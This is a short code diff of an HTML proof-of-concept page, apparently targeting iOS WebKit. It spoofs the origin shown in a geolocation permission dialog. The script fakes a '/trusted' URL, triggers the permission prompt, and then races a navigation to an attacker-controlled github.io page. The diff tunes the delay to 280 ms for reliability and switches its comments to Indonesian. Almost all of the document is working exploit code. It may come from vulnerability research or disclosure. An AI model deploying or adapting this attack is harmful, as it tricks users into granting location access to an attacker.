@@ -9,28 +9,28 @@
 <body style="font-family:system-ui; text-align:center; margin-top:80px">
 
 <h2>Trusted Service</h2>
-<p>You are on a trusted page.</p>
 <p style="color:#b00020;font-size:13px">
-Observe the origin shown in the permission dialog.
+Perhatikan origin pada dialog izin lokasi
 </p>
 
 <button id="start">Continue</button>
 
 <script>
 document.getElementById('start').onclick = () => {
-  // 1️⃣ Make URL look trusted
+  // 1️⃣ Buat URL terlihat trusted
   history.pushState({}, '', '/trusted');
 
-  // 2️⃣ Trigger geolocation permission from VICTIM origin
+  // 2️⃣ Victim memicu dialog izin (SATU-SATUNYA dialog)
   navigator.geolocation.getCurrentPosition(
     () => {},
     () => {}
   );
 
-  // 3️⃣ Navigation race AFTER permission request starts
+  // 3️⃣ Race navigation (dituning untuk iOS)
   setTimeout(() => {
-    location.href = 'https://cnfdnfial-ops.github.io/spoof/attacker.html';
-  }, 120); // delay tuned for iOS WebKit
+    location.href =
+      'https://cnfdnfial-ops.github.io/spoof/attacker.html';
+  }, 280); // ⬅️ stabil di iOS WebKit
 };
 </script>
 
